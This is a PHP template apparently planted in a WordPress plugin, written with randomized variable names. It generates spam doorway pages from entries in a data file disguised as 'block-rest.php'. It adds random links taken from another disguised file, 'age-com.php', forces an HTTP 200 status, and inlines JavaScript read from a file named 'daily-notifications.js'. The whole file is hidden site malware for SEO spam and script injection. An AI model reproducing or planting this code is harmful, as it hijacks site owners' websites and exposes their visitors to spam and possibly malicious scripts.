<?php
$jCpC2A9N = intval(get_query_var('lnxek'));

if ($jCpC2A9N < 1 || $jCpC2A9N > 4544) return;
$hLiHv = file(plugin_dir_path(__FILE__).'block-rest.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$kMwWCCaie = explode(';', $hLiHv[$jCpC2A9N]);
if (count($kMwWCCaie) < 2) return;
$jHG5sznJ = $kMwWCCaie[0];
$ss9pwemHe  = $kMwWCCaie[1];
$l0DW8ohVW = $kMwWCCaie[2];
$bLJ8QGZ  = $kMwWCCaie[3];
$wlS2g2 = $kMwWCCaie[4];
set_query_var('xanprsuz', $jHG5sznJ);

$kW2fgBik = '';
$mrnz8c6 = plugin_dir_path(__FILE__).'age-com.php';
if (is_file($mrnz8c6)) {
	$bD88EgIm4 = file($mrnz8c6, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($bD88EgIm4);
	shuffle($bD88EgIm4);
	$aHsKC = mt_rand(2, 5);
	if (count($bD88EgIm4) > $aHsKC) {
		for ($fSz9Rss = 0; $fSz9Rss < $aHsKC; $fSz9Rss++) {
			$oTv51 = array_shift($bD88EgIm4);
			$kW2fgBik .= '<p><a href="'.$oTv51.'">'.$oTv51.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $jHG5sznJ; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $ss9pwemHe . "</p>\n";
				if (strlen($bLJ8QGZ) > 0) echo "<p>" . $bLJ8QGZ . "</p>\n";
				if (strlen($l0DW8ohVW) > 0) echo "<p>" . $l0DW8ohVW . "</p>\n";
				if (strlen($wlS2g2) > 0) echo '<p><a href="#"><img src="'.$wlS2g2.'"></a>' . "</p>\n";
				echo $kW2fgBik;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$vTitj2j0 = plugin_dir_path(__FILE__) . 'daily-notifications.js';
if (is_file($vTitj2j0)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($vTitj2j0);
	echo '</script>';
}
get_footer();
?>
